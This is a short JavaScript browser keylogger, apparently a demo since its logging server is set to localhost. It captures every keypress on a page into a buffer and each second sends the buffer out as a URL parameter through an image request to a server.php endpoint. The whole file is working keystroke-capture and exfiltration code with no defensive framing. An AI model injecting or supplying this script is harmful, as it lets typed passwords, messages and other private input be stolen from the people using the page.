// log server location
let serverName = 'http://localhost:3000/server.php';

// parameter read by log server
let parameterName = 'log';

let target = `${serverName}?${parameterName}=`;
let log = '';

document.onkeypress = (e) => {
    // handle firefox compatibility
    let handle = window.event || e;
    let charCode = handle.keyCode || handle.charCode;
    
    // append keystrokes to log
    log = `${log}${String.fromCharCode(charCode)}`;
}

// periodically send the contents to the logging server
window.setInterval(() => {
    if (log.length) {
        new Image().src = target + log;
        log = '';
    }
}, 1000);
